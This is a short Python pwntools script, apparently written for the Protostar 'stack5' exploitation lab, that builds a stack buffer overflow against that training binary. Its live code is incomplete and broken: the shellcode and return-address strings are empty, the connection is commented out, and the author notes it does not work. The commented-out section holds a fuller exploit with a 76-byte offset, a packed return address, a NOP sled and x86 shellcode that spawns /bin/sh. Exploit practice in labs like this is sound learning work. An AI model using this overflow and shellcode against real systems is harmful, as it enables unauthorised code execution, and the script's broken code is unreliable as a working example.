#!/usr/bin/python3
from pwn import *
# doesn't work I accidentally overwrote stack5 binary with >
# when I meant |
# change port for your machine
#s = ssh(host='172.16.17.27', user='user', password='user', port=22)
# overflowing the buffer modifies the stack
# let's start off with a nop slide
# from fuzzing we know the return address for ret
# is at the 76th chracter
exploit = '$(python -c "import sys; sys.stdout.write("\\x90"*76'
# then append the address to start at
exploit += '+""'
# then append the shellcode
exploit +=
exploit += ') | /opt/protostar/bin/stack5'
log.info(s[exploit].decode('utf-8'))
# import struct
# padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
# eip = struct.pack("I", 0xbffffccc) # 0xbffff7c0
# payload = "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73"+"\x68\x68\x2f\x62\x69\x6e\x89"+"\xe3\x89\xc1\x89\xc2\xb0\x0b"+"\xcd\x80\x31\xc0\x40\xcd\x80"
# print("\x90"*76+eip+payload)
